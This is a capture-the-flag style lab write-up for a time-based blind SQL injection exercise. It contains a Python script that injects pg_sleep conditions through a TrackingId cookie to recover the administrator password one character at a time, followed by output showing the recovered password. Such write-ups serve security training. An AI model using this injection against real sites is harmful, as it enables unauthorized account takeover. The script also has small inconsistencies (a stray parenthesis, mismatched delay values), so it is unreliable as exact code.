### Fourteen Exercise 👆


![problem.PNG](/assets/SQLi/First/problem.PNG)

#### **To do**
```
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.  
```


1. Manipulate last python script to crack password
```bash
#!/usr/bin/python3

from pwn import *
import requests, time, string, signal, sys


def handler_stop(sig, frame):
        print("\n\n[!] Saliendo... Bye")
        sys.exit(1)

def make_request():
    url = "<url>"
    characteres = string.ascii_lowercase + string.digits
    password = ""
    bar_1 = log.progress("Brute Force")
    bar_1.status("Starting Brute Force...")
    time.sleep(1)
    bar_2 = log.progress("Password")
    
    for i in range(1,21):
        for character in characteres:
            cookie = {"TrackingId": f"<Your TrackId>'||(select case when substring(password,{i},1) = '{character}' then pg_sleep(1.5) else pg_sleep(0) end from users where username='administrator')-- -",
                        "session": "<session>"}
            bar_1.status(cookie["TrackingId"])
            time_start = time.time()
            r = requests.get(url, cookies=cookie)   
            time_end = time.time()
            if ((time_end - time_start) > 1.5)):
                password += character
                bar_2.status(password)
                break
#Ctrl + C
signal.signal(signal.SIGINT, handler_stop)

if __name__ == "__main__":
        make_request()


```

* If the letter is correct the page await 1.5 seconds to response and the letter is concatenate in **password**

```bash
┌──(root㉿est)-[/home/kali/Desktop]
└─| python3 SQL_time.py
[├] Brute Force: aNi8t9y9BxgDIjb5'||(select case when substring(password,20,1) = 'y' then pg_sleep(3) else pg_sleep(0) end from users where username='administrator')-- -
[→] Password: yyjok5fypzubpv4e7roy
```


2. Finally login with credentials:
* **username**: administrator
* **password**: [output program]

![login.txt](/assets/SQLi/Eleven/login.PNG)